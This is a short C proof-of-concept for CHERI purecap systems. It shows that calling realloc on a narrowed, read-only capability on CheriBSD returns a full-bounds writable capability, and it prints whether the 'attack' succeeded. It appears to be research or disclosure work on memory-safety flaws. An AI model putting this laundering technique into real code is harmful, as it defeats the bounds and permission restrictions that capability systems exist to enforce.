#include <assert.h>
#include <cheriintrin.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#if !defined(__CHERI_PURE_CAPABILITY__)
#  error This example must be run on a CHERI purecap system
#endif

// On CheriBSD, if a capability's bounds include the base pointer to a
// `malloc`d block we can use `realloc` to launder a lower-priviliged
// capability into a higher-priviliged capability one. In other words if:
//   1. malloc returns a capability C1 to a block 0..n bytes long
//   2. we create a capability C2 with: bounds 0..m where m < n; and with write
//      privileges turned off
//   3. realloc allows us to launder C2 back into C1

int main() {
    // malloc returns a capability C1 to a block 0..n bytes long
    uint8_t *arr = malloc(16);
    assert(cheri_perms_get(arr) & (CHERI_PERM_LOAD | CHERI_PERM_STORE));

    // Derive a capability C2 with bounds 0..m where m < n
    arr = cheri_bounds_set(arr, 8);
    assert(cheri_tag_get(arr) && cheri_length_get(arr) == 8);
    // Make C2 read-only.
    arr = cheri_perms_and(arr, CHERI_PERM_LOAD);
    assert((cheri_perms_get(arr) & CHERI_PERM_STORE) == 0);

    // realloc allows us to turn C2 back into C1
    arr = realloc(arr, 16);
    if (cheri_tag_get(arr) && cheri_length_get(arr) == 16 && cheri_perms_get(arr) & CHERI_PERM_STORE) {
	printf("Attack successful\n");
    } else {
        printf("Attack unsuccessful\n");
    }
    return 0;
}
